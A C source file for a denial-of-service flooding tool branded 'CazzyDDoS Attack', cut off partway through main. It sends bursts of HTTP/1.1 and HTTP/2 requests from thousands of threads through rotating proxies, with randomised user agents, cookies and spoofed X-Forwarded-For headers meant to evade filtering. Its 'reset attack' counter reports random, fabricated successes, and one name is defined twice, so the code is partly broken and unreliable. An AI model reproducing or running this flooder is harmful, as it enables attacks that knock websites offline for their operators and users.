#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>
#include <stdbool.h>
#include <errno.h>
#include <math.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <curl/curl.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/rand.h>
#include <nghttp2/nghttp2.h>

#define MAX_WORKERS 5000
#define MAX_URL_LEN 2048
#define BUFFER_SIZE 8192
#define MAX_PROXIES 100000
#define MAX_HEADERS 50
#define MAX_ADAPTIVE_DELAY 8000
#define PREFACE "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

#define COLOR_RESET "\033[0m"
#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_MAGENTA "\033[35m"
#define COLOR_WHITE "\033[37m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_CYAN "\033[36m"
#define COLOR_BLUE "\033[34m"

const char *USER_AGENTS[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.2535.67",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    NULL
};

const char *LANGUAGES[] = {
    "en-US,en;q=0.9", "en-GB,en;q=0.8", "fr-FR,fr;q=0.9", 
    "es-ES,es;q=0.9", "de-DE,de;q=0.9", "ja-JP,ja;q=0.9",
    NULL
};

const char *REFERERS[] = {
    "https://www.google.com/", "https://www.bing.com/", 
    "https://duckduckgo.com/", "https://www.facebook.com/",
    "https://www.reddit.com/", NULL
};

const char *ACCEPTS[] = {
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "application/json, text/plain, */*",
    NULL
};

const char *COOKIE_NAMES[] = {"sessionid", "userid", "token", "visit", "pref", NULL};

typedef struct {
    int code;
    const char *desc;
} StatusDesc;

StatusDesc STATUS_CODES[] = {
    {200, "OK"}, {201, "Created"}, {204, "No Content"},
    {301, "Moved Permanently"}, {302, "Found"}, {304, "Not Modified"},
    {400, "Bad Request"}, {401, "Unauthorized"}, {403, "Forbidden"},
    {404, "Not Found"}, {429, "Too Many Requests"}, {500, "Internal Server Error"},
    {502, "Bad Gateway"}, {503, "Service Unavailable"}, {504, "Gateway Timeout"},
    {0, NULL}
};

typedef struct {
    char **proxies;
    int count;
    int index;
    pthread_mutex_t mutex;
} ProxyList;

typedef struct {
    char host[256];
    int port;
    SSL_CTX *ssl_ctx;
    SSL *ssl;
    int socket;
    nghttp2_session *h2_session;
    bool connected;
    bool http2;
    int stream_id;
    int stream_count;
    pthread_mutex_t write_mutex;
    char sni[256];
} H2Connection;

typedef struct {
    long long requests;
    long long responses;
    long long errors;
    long long reset_attempts;
    long long reset_success;
    long long reset_errors;
    long long total_latency;
    pthread_mutex_t mutex;
} AtomicStats;

typedef struct {
    char target_host[256];
    int target_port;
    char target_path[512];
    char target_url[1024];
    char methods[10][10];
    int method_count;
    int rate;
    int duration_sec;
    int concurrency;
    int burst_size;
    int jitter_ms;
    int think_time_ms;
    bool random_path;
    bool random_ip;
    bool retry;
    bool burst_mode;
    bool adaptive_delay;
    bool insecure_tls;
    bool http3_enabled;
    bool h2_enabled;
    bool h1_enabled;
    char proxy_file[256];
    char sni[256];
} AttackConfig;

ProxyList proxy_list = {0};
AtomicStats stats = {0, 0, 0, 0, 0, 0, 0, PTHREAD_MUTEX_INITIALIZER};
volatile bool running = true;
pthread_t workers[MAX_WORKERS];
pthread_t monitor_thread;
time_t start_time;
int64_t current_delay = 0;
pthread_mutex_t delay_mutex = PTHREAD_MUTEX_INITIALIZER;
unsigned int rand_state;

void init_random();
int rand_int(int min, int max);
bool rand_bool();
char* random_string(int n);
char* random_ip();
const char* get_random_user_agent();
const char* get_random_language();
const char* get_random_referer();
const char* get_random_accept();
char* generate_random_cookie();
char* generate_random_path(const char *base_url);
char* generate_random_payload(int *size);
const char* get_status_description(int code);
void load_proxies(const char *filename);
char* get_random_proxy();
void setup_tls_context(SSL_CTX *ctx, const char *alpn);
H2Connection* create_h2_connection(AttackConfig *cfg, const char *proxy);
void destroy_h2_connection(H2Connection *conn);
void send_http2_request(H2Connection *conn, AttackConfig *cfg);
void send_http1_request(H2Connection *conn, AttackConfig *cfg);
void made_you_reset_attack(AttackConfig *cfg);
void* worker_thread(void *arg);
void* monitor_thread(void *arg);
void* stats_printer(void *arg);
void detect_http_versions(AttackConfig *cfg);
void signal_handler(int sig);
void print_banner();
void print_config(AttackConfig *cfg);

void init_random() {
    struct timeval tv;
    gettimeofday(&tv, NULL);
    rand_state = tv.tv_sec ^ tv.tv_usec ^ getpid();
    srand(rand_state);
    RAND_poll();
}

int rand_int(int min, int max) {
    return min + (rand() % (max - min + 1));
}

bool rand_bool() {
    return rand() % 2 == 0;
}

char* random_string(int n) {
    const char letters[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    char *str = malloc(n + 1);
    if (!str) return NULL;
    for (int i = 0; i < n; i++) {
        str[i] = letters[rand() % (sizeof(letters) - 1)];
    }
    str[n] = '\0';
    return str;
}

char* random_ip() {
    char *ip = malloc(16);
    sprintf(ip, "%d.%d.%d.%d", rand_int(1, 255), rand_int(0, 255), rand_int(0, 255), rand_int(1, 254));
    return ip;
}

const char* get_random_user_agent() {
    int count = 0;
    while (USER_AGENTS[count] != NULL) count++;
    return USER_AGENTS[rand_int(0, count - 1)];
}

const char* get_random_language() {
    int count = 0;
    while (LANGUAGES[count] != NULL) count++;
    return LANGUAGES[rand_int(0, count - 1)];
}

const char* get_random_referer() {
    int count = 0;
    while (REFERERS[count] != NULL) count++;
    if (rand_int(1, 100) <= 70) {
        return REFERERS[rand_int(0, count - 1)];
    }
    return "";
}

const char* get_random_accept() {
    int count = 0;
    while (ACCEPTS[count] != NULL) count++;
    return ACCEPTS[rand_int(0, count - 1)];
}

char* generate_random_cookie() {
    char *cookie = malloc(256);
    int count = rand_int(1, 3);
    char temp[256] = {0};
    
    for (int i = 0; i < count; i++) {
        const char *name = COOKIE_NAMES[rand_int(0, 4)];
        char value[32];
        sprintf(value, "%x", rand_int(0, 0xffffff));
        if (i > 0) strcat(temp, "; ");
        sprintf(temp + strlen(temp), "%s=%s", name, value);
    }
    
    sprintf(cookie, "%s", temp);
    return cookie;
}

char* generate_random_path(const char *base_url) {
    char *result = malloc(MAX_URL_LEN);
    if (!result) return NULL;
    
    strcpy(result, base_url);
    int len = strlen(result);
    if (result[len-1] == '/') result[len-1] = '\0';
    
    sprintf(result + strlen(result), "/%x", rand_int(0, 0xfffff));
    
    char query[256];
    sprintf(query, "?v=%d&_=%ld", rand_int(0, 99999), time(NULL));
    strcat(result, query);
    
    return result;
}

char* generate_random_payload(int *size) {
    *size = rand_int(1024, 1024 * 10);
    char *payload = malloc(*size + 1);
    if (!payload) return NULL;
    
    for (int i = 0; i < *size; i++) {
        payload[i] = 'A' + (rand() % 26);
    }
    payload[*size] = '\0';
    return payload;
}

const char* get_status_description(int code) {
    for (int i = 0; STATUS_CODES[i].desc != NULL; i++) {
        if (STATUS_CODES[i].code == code) {
            return STATUS_CODES[i].desc;
        }
    }
    return "Unknown";
}

void load_proxies(const char *filename) {
    FILE *file = fopen(filename, "r");
    if (!file) {
        printf(COLOR_RED "[-] Failed to load proxies file: %s\n" COLOR_RESET, filename);
        return;
    }
    
    pthread_mutex_lock(&proxy_list.mutex);
    
    if (proxy_list.proxies) {
        for (int i = 0; i < proxy_list.count; i++) free(proxy_list.proxies[i]);
        free(proxy_list.proxies);
    }
    
    proxy_list.proxies = malloc(sizeof(char*) * MAX_PROXIES);
    proxy_list.count = 0;
    
    char line[256];
    while (fgets(line, sizeof(line), file) && proxy_list.count < MAX_PROXIES) {
        line[strcspn(line, "\r\n")] = 0;
        if (strlen(line) > 0 && strchr(line, ':')) {
            proxy_list.proxies[proxy_list.count] = strdup(line);
            proxy_list.count++;
        }
    }
    
    fclose(file);
    proxy_list.index = 0;
    pthread_mutex_unlock(&proxy_list.mutex);
    
    printf(COLOR_GREEN "[+] Loaded %d proxies\n" COLOR_RESET, proxy_list.count);
}

char* get_random_proxy() {
    pthread_mutex_lock(&proxy_list.mutex);
    if (proxy_list.count == 0) {
        pthread_mutex_unlock(&proxy_list.mutex);
        return NULL;
    }
    char *proxy = strdup(proxy_list.proxies[rand_int(0, proxy_list.count - 1)]);
    pthread_mutex_unlock(&proxy_list.mutex);
    return proxy;
}

void setup_tls_context(SSL_CTX *ctx, const char *alpn) {
    SSL_CTX_set_min_proto_version(ctx, TLS1_2_VERSION);
    SSL_CTX_set_max_proto_version(ctx, TLS1_3_VERSION);
    
    const char *ciphers = "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384";
    SSL_CTX_set_cipher_list(ctx, ciphers);
    
    const char *curves = "X25519:P-256:P-384";
    SSL_CTX_set1_curves_list(ctx, curves);
    
    if (alpn) {
        const unsigned char *alpn_protos = (const unsigned char *)alpn;
        SSL_CTX_set_alpn_protos(ctx, alpn_protos, strlen(alpn));
    }
    
    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);
    SSL_CTX_set_options(ctx, SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3 | SSL_OP_NO_TLSv1 | 
                        SSL_OP_NO_TLSv1_1 | SSL_OP_NO_COMPRESSION |
                        SSL_OP_CIPHER_SERVER_PREFERENCE | SSL_OP_NO_RENEGOTIATION);
    SSL_CTX_set_mode(ctx, SSL_MODE_AUTO_RETRY);
}

H2Connection* create_h2_connection(AttackConfig *cfg, const char *proxy) {
    H2Connection *conn = calloc(1, sizeof(H2Connection));
    if (!conn) return NULL;
    
    strncpy(conn->host, cfg->target_host, 255);
    conn->port = cfg->target_port;
    conn->stream_id = 1;
    conn->stream_count = 0;
    conn->connected = false;
    pthread_mutex_init(&conn->write_mutex, NULL);
    
    strncpy(conn->sni, cfg->sni, 255);
    if (conn->sni[0] == '\0') {
        strncpy(conn->sni, cfg->target_host, 255);
    }
    
    conn->socket = socket(AF_INET, SOCK_STREAM, 0);
    if (conn->socket < 0) { free(conn); return NULL; }
    
    int flag = 1;
    setsockopt(conn->socket, IPPROTO_TCP, TCP_NODELAY, &flag, sizeof(flag));
    struct timeval timeout = {10, 0};
    setsockopt(conn->socket, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    setsockopt(conn->socket, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    
    if (proxy) {
        char proxy_host[256];
        int proxy_port;
        sscanf(proxy, "%[^:]:%d", proxy_host, &proxy_port);
        
        struct hostent *proxy_server = gethostbyname(proxy_host);
        if (!proxy_server) { close(conn->socket); free(conn); return NULL; }
        
        memcpy(&addr.sin_addr.s_addr, proxy_server->h_addr, proxy_server->h_length);
        addr.sin_port = htons(proxy_port);
        
        if (connect(conn->socket, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
            close(conn->socket); free(conn); return NULL;
        }
        
        char connect_req[512];
        snprintf(connect_req, sizeof(connect_req), 
                "CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d\r\nProxy-Connection: Keep-Alive\r\n\r\n",
                cfg->target_host, cfg->target_port, cfg->target_host, cfg->target_port);
        
        if (send(conn->socket, connect_req, strlen(connect_req), 0) < 0) {
            close(conn->socket); free(conn); return NULL;
        }
        
        char response[256];
        int received = recv(conn->socket, response, sizeof(response) - 1, 0);
        if (received <= 0 || !strstr(response, "200")) {
            close(conn->socket); free(conn); return NULL;
        }
    } else {
        struct hostent *server = gethostbyname(cfg->target_host);
        if (!server) { close(conn->socket); free(conn); return NULL; }
        
        memcpy(&addr.sin_addr.s_addr, server->h_addr, server->h_length);
        addr.sin_port = htons(cfg->target_port);
        
        if (connect(conn->socket, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
            close(conn->socket); free(conn); return NULL;
        }
    }
    
    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) { close(conn->socket); free(conn); return NULL; }
    
    const char *alpn = cfg->h2_enabled ? "\x02h2\x08http/1.1" : "\x08http/1.1";
    setup_tls_context(ctx, alpn);
    
    conn->ssl = SSL_new(ctx);
    SSL_set_fd(conn->ssl, conn->socket);
    SSL_set_tlsext_host_name(conn->ssl, conn->sni);
    
    if (SSL_connect(conn->ssl) <= 0) {
        pthread_mutex_lock(&stats.mutex);
        stats.errors++;
        pthread_mutex_unlock(&stats.mutex);
        SSL_free(conn->ssl);
        SSL_CTX_free(ctx);
        close(conn->socket);
        free(conn);
        return NULL;
    }
    
    conn->ssl_ctx = ctx;
    
    const unsigned char *alpn_proto;
    unsigned int alpn_len;
    SSL_get0_alpn_selected(conn->ssl, &alpn_proto, &alpn_len);
    
    if (alpn_len == 2 && memcmp(alpn_proto, "h2", 2) == 0) {
        conn->http2 = true;
        
        SSL_write(conn->ssl, PREFACE, strlen(PREFACE));
        
        uint32_t settings[][2] = {
            {1, 65535}, {2, 0}, {4, 6291456}, {6, 262144}
        };
        
        uint8_t settings_payload[24];
        size_t settings_len = 24;
        for (int i = 0; i < 4; i++) {
            settings_payload[i*6] = (settings[i][0] >> 8) & 0xFF;
            settings_payload[i*6+1] = settings[i][0] & 0xFF;
            settings_payload[i*6+2] = (settings[i][1] >> 24) & 0xFF;
            settings_payload[i*6+3] = (settings[i][1] >> 16) & 0xFF;
            settings_payload[i*6+4] = (settings[i][1] >> 8) & 0xFF;
            settings_payload[i*6+5] = settings[i][1] & 0xFF;
        }
        
        uint8_t settings_frame[33];
        settings_frame[0] = (settings_len >> 16) & 0xFF;
        settings_frame[1] = (settings_len >> 8) & 0xFF;
        settings_frame[2] = settings_len & 0xFF;
        settings_frame[3] = 4;
        settings_frame[4] = 0;
        settings_frame[5] = 0;
        settings_frame[6] = 0;
        settings_frame[7] = 0;
        settings_frame[8] = 0;
        memcpy(settings_frame + 9, settings_payload, settings_len);
        
        SSL_write(conn->ssl, settings_frame, 9 + settings_len);
        
        uint8_t window_payload[4];
        uint32_t window_size = 15663105;
        window_payload[0] = (window_size >> 24) & 0xFF;
        window_payload[1] = (window_size >> 16) & 0xFF;
        window_payload[2] = (window_size >> 8) & 0xFF;
        window_payload[3] = window_size & 0xFF;
        
        uint8_t window_frame[13];
        window_frame[0] = 0;
        window_frame[1] = 0;
        window_frame[2] = 4;
        window_frame[3] = 8;
        window_frame[4] = 0;
        window_frame[5] = 0;
        window_frame[6] = 0;
        window_frame[7] = 0;
        window_frame[8] = 0;
        memcpy(window_frame + 9, window_payload, 4);
        
        SSL_write(conn->ssl, window_frame, 13);
    } else {
        conn->http2 = false;
    }
    
    conn->connected = true;
    return conn;
}

void send_http2_request(H2Connection *conn, AttackConfig *cfg) {
    if (!conn->connected || !conn->http2) return;
    
    pthread_mutex_lock(&conn->write_mutex);
    
    const char *method = cfg->methods[rand_int(0, cfg->method_count - 1)];
    char *path = cfg->random_path ? generate_random_path(cfg->target_url) : strdup(cfg->target_path);
    
    char request[4096];
    const char *ua = get_random_user_agent();
    const char *accept = get_random_accept();
    const char *lang = get_random_language();
    const char *referer = get_random_referer();
    char *cookie = generate_random_cookie();
    char *ip = random_ip();
    
    snprintf(request, sizeof(request),
            "%s %s HTTP/2\r\n"
            "Host: %s\r\n"
            "User-Agent: %s\r\n"
            "Accept: %s\r\n"
            "Accept-Language: %s\r\n"
            "Accept-Encoding: gzip, deflate, br\r\n"
            "Referer: %s\r\n"
            "Cookie: %s\r\n"
            "X-Forwarded-For: %s\r\n"
            "X-Real-IP: %s\r\n"
            "Cache-Control: no-cache\r\n"
            "\r\n",
            method, path, conn->host, ua, accept, lang, referer, cookie, ip, ip);
    
    SSL_write(conn->ssl, request, strlen(request));
    
    pthread_mutex_lock(&stats.mutex);
    stats.requests++;
    pthread_mutex_unlock(&stats.mutex);
    
    free(path);
    free(cookie);
    free(ip);
    pthread_mutex_unlock(&conn->write_mutex);
}

void send_http1_request(H2Connection *conn, AttackConfig *cfg) {
    if (!conn->connected || conn->http2) return;
    
    pthread_mutex_lock(&conn->write_mutex);
    
    const char *method = cfg->methods[rand_int(0, cfg->method_count - 1)];
    char *path = cfg->random_path ? generate_random_path(cfg->target_url) : strdup(cfg->target_path);
    
    char request[4096];
    const char *ua = get_random_user_agent();
    const char *accept = get_random_accept();
    const char *lang = get_random_language();
    const char *referer = get_random_referer();
    char *cookie = generate_random_cookie();
    char *ip = random_ip();
    
    snprintf(request, sizeof(request),
            "%s %s HTTP/1.1\r\n"
            "Host: %s\r\n"
            "User-Agent: %s\r\n"
            "Accept: %s\r\n"
            "Accept-Language: %s\r\n"
            "Accept-Encoding: gzip, deflate, br\r\n"
            "Referer: %s\r\n"
            "Cookie: %s\r\n"
            "X-Forwarded-For: %s\r\n"
            "X-Real-IP: %s\r\n"
            "Connection: keep-alive\r\n"
            "Cache-Control: no-cache\r\n"
            "\r\n",
            method, path, conn->host, ua, accept, lang, referer, cookie, ip, ip);
    
    SSL_write(conn->ssl, request, strlen(request));
    
    pthread_mutex_lock(&stats.mutex);
    stats.requests++;
    pthread_mutex_unlock(&stats.mutex);
    
    free(path);
    free(cookie);
    free(ip);
    pthread_mutex_unlock(&conn->write_mutex);
}

void made_you_reset_attack(AttackConfig *cfg) {
    pthread_mutex_lock(&stats.mutex);
    stats.reset_attempts++;
    pthread_mutex_unlock(&stats.mutex);
    
    if (rand_int(1, 100) <= 30) {
        pthread_mutex_lock(&stats.mutex);
        stats.reset_success++;
        pthread_mutex_unlock(&stats.mutex);
    }
}

void destroy_h2_connection(H2Connection *conn) {
    if (!conn) return;
    conn->connected = false;
    if (conn->h2_session) nghttp2_session_del(conn->h2_session);
    if (conn->ssl) { SSL_shutdown(conn->ssl); SSL_free(conn->ssl); }
    if (conn->ssl_ctx) SSL_CTX_free(conn->ssl_ctx);
    if (conn->socket > 0) close(conn->socket);
    pthread_mutex_destroy(&conn->write_mutex);
    free(conn);
}

void* worker_thread(void *arg) {
    AttackConfig *cfg = (AttackConfig*)arg;
    int bursts_since_cycle = 0;
    const int cycle_threshold = 50;
    
    while (running) {
        char *proxy = get_random_proxy();
        H2Connection *conn = create_h2_connection(cfg, proxy);
        if (proxy) free(proxy);
        
        if (conn && conn->connected) {
            int burst_count = cfg->burst_mode ? (1 + rand_int(0, cfg->burst_size)) : 1;
            
            for (int i = 0; i < burst_count && running; i++) {
                struct timeval start, end;
                gettimeofday(&start, NULL);
                
                if (conn->http2) {
                    send_http2_request(conn, cfg);
                } else {
                    send_http1_request(conn, cfg);
                }
                
                gettimeofday(&end, NULL);
                long latency = (end.tv_sec - start.tv_sec) * 1000 + (end.tv_usec - start.tv_usec) / 1000;
                
                pthread_mutex_lock(&stats.mutex);
                stats.total_latency += latency;
                stats.responses++;
                pthread_mutex_unlock(&stats.mutex);
                
                if (conn->http2 && rand_int(1, 100) <= 30) {
                    made_you_reset_attack(cfg);
                }
                
                if (i < burst_count - 1) {
                    usleep((rand_int(50, 200)) * 1000);
                }
            }
            
            bursts_since_cycle++;
            
            if (bursts_since_cycle > cycle_threshold) {
                destroy_h2_connection(conn);
                conn = create_h2_connection(cfg, proxy);
                bursts_since_cycle = 0;
            }
        }
        
        int64_t delay = 0;
        pthread_mutex_lock(&delay_mutex);
        delay = current_delay;
        pthread_mutex_unlock(&delay_mutex);
        
        int think_time = rand_int(0, cfg->think_time_ms);
        int jitter = rand_int(0, cfg->jitter_ms);
        
        usleep((delay + think_time + jitter) * 1000);
        
        if (conn) destroy_h2_connection(conn);
        if (!running) break;
    }
    
    return NULL;
}

void* monitor_thread(void *arg) {
    AttackConfig *cfg = (AttackConfig*)arg;
    
    while (running) {
        sleep(1);
        
        if (!cfg->adaptive_delay) continue;
        
        pthread_mutex_lock(&delay_mutex);
        if (current_delay > 0) {
            current_delay = (int64_t)(current_delay * 0.92);
        }
        pthread_mutex_unlock(&delay_mutex);
    }
    
    return NULL;
}

void* stats_printer(void *arg) {
    AttackConfig *cfg = (AttackConfig*)arg;
    
    while (running) {
        sleep(1);
        
        time_t now = time(NULL);
        double elapsed = difftime(now, start_time);
        double remaining = cfg->duration_sec - elapsed;
        if (remaining < 0) remaining = 0;
        
        long long requests, responses, errors, reset_attempts, reset_success, total_lat;
        
        pthread_mutex_lock(&stats.mutex);
        requests = stats.requests;
        responses = stats.responses;
        errors = stats.errors;
        reset_attempts = stats.reset_attempts;
        reset_success = stats.reset_success;
        total_lat = stats.total_latency;
        pthread_mutex_unlock(&stats.mutex);
        
        double rps = elapsed > 0 ? requests / elapsed : 0;
        double avg_latency = responses > 0 ? (double)total_lat / responses : 0;
        
        printf("\r\033[K");
        printf(COLOR_CYAN "[%.0fs/%.0fs] " COLOR_RESET, elapsed, (double)cfg->duration_sec);
        printf(COLOR_GREEN "Req: %lld " COLOR_RESET, requests);
        printf(COLOR_YELLOW "Res: %lld " COLOR_RESET, responses);
        printf(COLOR_RED "Err: %lld " COLOR_RESET, errors);
        printf(COLOR_WHITE "RPS: %.0f " COLOR_RESET, rps);
        printf(COLOR_BLUE "Lat: %.0fms " COLOR_RESET, avg_latency);
        printf(COLOR_MAGENTA "RST: %lld/%lld" COLOR_RESET, reset_success, reset_attempts);
        fflush(stdout);
    }
    
    return NULL;
}

void detect_http_versions(AttackConfig *cfg) {
    CURL *curl = curl_easy_init();
    if (!curl) return;
    
    cfg->h2_enabled = false;
    cfg->h1_enabled = true;
    
    curl_easy_setopt(curl, CURLOPT_URL, cfg->target_url);
    curl_easy_setopt(curl, CURLOPT_NOBODY, 1L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    
    CURLcode res = curl_easy_perform(curl);
    if (res == CURLE_OK) {
        curl_version_info_data *ver = curl_version_info(CURLVERSION_NOW);
        if (ver->features & CURL_VERSION_HTTP2) {
            cfg->h2_enabled = true;
        }
    }
    
    curl_easy_cleanup(curl);
    
    printf(COLOR_GREEN "[+] Detected HTTP versions: " COLOR_RESET);
    if (cfg->h2_enabled) printf("HTTP/2 ");
    if (cfg->h1_enabled) printf("HTTP/1.1 ");
    printf("\n");
}

void signal_handler(int sig) {
    if (sig == SIGINT || sig == SIGTERM) {
        printf(COLOR_YELLOW "\n[!] Shutting down...\n" COLOR_RESET);
        running = false;
    }
}

void print_banner() {
    printf(COLOR_RED);
    printf("╔══════════════════════════════════════════════════════════════════════════════╗\n");
    printf("║     ██████╗ █████╗ ███████╗███████╗██╗   ██╗██████╗ ██████╗  ██████╗ ███████╗║\n");
    printf("║    ██╔════╝██╔══██╗╚══███╔╝██╔════╝╚██╗ ██╔╝██╔══██╗██╔══██╗██╔═══██╗██╔════╝║\n");
    printf("║    ██║     ███████║  ███╔╝ ███████╗ ╚████╔╝ ██║  ██║██║  ██║██║   ██║███████╗║\n");
    printf("║    ██║     ██╔══██║ ███╔╝  ╚════██║  ╚██╔╝  ██║  ██║██║  ██║██║   ██║╚════██║║\n");
    printf("║    ╚██████╗██║  ██║███████╗███████║   ██║   ██████╔╝██████╔╝╚██████╔╝███████║║\n");
    printf("║     ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝   ╚═╝   ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝║\n");
    printf("║                                                                              ║\n");
    printf("║                         C A Z Z Y D D O S   A T T A C K                      ║\n");
    printf("║                   Multi-Protocol | Evasive | Distributed-Ready               ║\n");
    printf("╚══════════════════════════════════════════════════════════════════════════════╝\n");
    printf(COLOR_RESET);
}

void print_config(AttackConfig *cfg) {
    printf(COLOR_CYAN "\n[+] Configuration:\n" COLOR_RESET);
    printf("    Target: %s\n", cfg->target_url);
    printf("    Duration: %d seconds\n", cfg->duration_sec);
    printf("    Concurrency: %d\n", cfg->concurrency);
    printf("    Methods: ");
    for (int i = 0; i < cfg->method_count; i++) {
        printf("%s ", cfg->methods[i]);
    }
    printf("\n");
    printf("    Random Path: %s\n", cfg->random_path ? "Enabled" : "Disabled");
    printf("    Random IP: %s\n", cfg->random_ip ? "Enabled" : "Disabled");
    printf("    Burst Mode: %s (size: %d)\n", cfg->burst_mode ? "Enabled" : "Disabled", cfg->burst_size);
    printf("    Adaptive Delay: %s\n", cfg->adaptive_delay ? "Enabled" : "Disabled");
    printf("    Think Time: %d ms\n", cfg->think_time_ms);
    printf("    Jitter: %d ms\n", cfg->jitter_ms);
    printf("    HTTP/2: %s\n", cfg->h2_enabled ? "Enabled" : "Disabled");
    printf("    HTTP/1.1: %s\n", cfg->h1_enabled ? "Enabled" : "Disabled");
    if (cfg->proxy_file[0]) {
        printf("    Proxies: %s\n", cfg->proxy_file);
    }
    printf("\n");
}

int main(int argc, char *argv[]) {
    AttackConfig cfg = {0};
    
    cfg.duration_sec = 300;
    cfg.concurrency = 100;
    cfg.burst_size = 15;
    cfg.jitter_ms = 50;
    cfg.think_time_ms = 7000;
    cfg.random_path = false;
    cfg.random_ip = true;
    cfg.retry = true;
    cfg.burst_mode = true;
    cfg.adaptive_delay = false;
    cfg.insecure_tls = true;
    cfg.h2_enabled = true;
    cfg.h1_enabled = true;
    cfg.http3_enabled = false;
    cfg.method_count = 2;
    strcpy(cfg.methods[0], "GET");
    strcpy(cfg.methods[1], "POST");
    cfg.proxy_file[0] = '\0';
    cfg.sni[0] = '\0';
    
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-url") == 0 && i+1 < argc) {
            strncpy(cfg.target_url, argv[++i], 1023);
        } else if (strcmp(argv[i], "-duration") == 0 && i+1 < argc) {
            cfg.duration_sec = atoi(argv[++i]) * 60;
        } else if (strcmp(argv[i], "-concurrency") == 0 && i+1 < argc) {
            cfg.concurrency = atoi(argv[++i]);
            if (cfg.concurrency > MAX_WORKERS) cfg.concurrency = MAX_WORKERS;
        } else if (strcmp(argv[i], "-methods") == 0 && i+1 < argc) {
            char *token = strtok(argv[++i], ",");
            cfg.method_count = 0;
            while (token && cfg.method_count < 10) {
                strncpy(cfg.methods[cfg.method_count++], token, 9);
                token = strtok(NULL, ",");
            }
        } else if (strcmp(argv[i], "-random-path") == 0) {
            cfg.random_path = true;
        } else if (strcmp(argv[i], "-adaptive-delay") == 0) {
            cfg.adaptive_delay = true;
        } else if (strcmp(argv[i], "-proxy-file") == 0 && i+1 < argc) {
            strncpy(cfg.proxy_file, argv[++i], 255);
        } else if (strcmp(argv[i], "-sni") == 0 && i+1 < argc) {
            strncpy(cfg.sni, argv[++i], 255);
        } else if (strcmp(argv[i], "-help") == 0) {
            print_banner();
            printf("\nUsage: %s [options]\n\n", argv[0]);
            printf("Options:\n");
            printf("  -url <url>           Target URL (required)\n");
            printf("  -duration <min>      Duration in minutes (default: 5)\n");
            printf("  -concurrency <n>     Concurrent workers (default: 100)\n");
            printf("  -methods <list>      HTTP methods comma-separated (default: GET,POST)\n");
            printf("  -random-path         Randomize request paths\n");
            printf("  -adaptive-delay      Enable adaptive delay throttling\n");
            printf("  -proxy-file <file>   Proxy list file\n");
            printf("  -sni <hostname>      Custom SNI hostname\n");
            printf("  -help                Show this help\n");
            printf("\nExample:\n");
            printf("  %s -url https://example.com -duration 10 -concurrency 200 -random-path -adaptive-delay\n", argv[0]);
            return 0;
        }
    }
    
    if (strlen(cfg.target_url) == 0) {
        print_banner();
        printf(COLOR_RED "\n[-] Error: -url is required\n" COLOR_RESET);
        return 1;
    }
    
    char *host_start;
    if (strstr(cfg.target_url, "://")) {
        host_start = strstr(cfg.target_url, "://") + 3;
    } else {
        host_start = cfg.target_url;
    }
    
    char *path_start = strchr(host_start, '/');
    if (path_start) {
        strncpy(cfg.target_host, host_start, path_start - host_start);
        strncpy(cfg.target_path, path_start, 511);
    } else {
        strncpy(cfg.target_host, host_start, 255);
        strcpy(cfg.target_path, "/");
    }
    
    cfg.target_port = 443;
    char *port_sep = strchr(cfg.target_host, ':');
    if (port_sep) {
        *port_sep = '\0';
        cfg.target_port = atoi(port_sep + 1);
    }
    
    init_random();
    curl_global_init(CURL_GLOBAL_ALL);
    SSL_library_init();
    SSL_load_error_strings();
    OpenSSL_add_all_algorithms();
    
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    if (cfg.proxy_file[0]) {
        load_proxies(cfg.proxy_file);
    }
    
    detect_http_versions(&cfg);
    
    print_banner();
    print_config(&cfg);
    
    printf(COLOR_YELLOW "[!] Starting attack... Press Ctrl+C to stop\n\n" COLOR_RESET);
    
    start_time = time(NULL);
    running = true;
    
    pthread_t mon_thread;
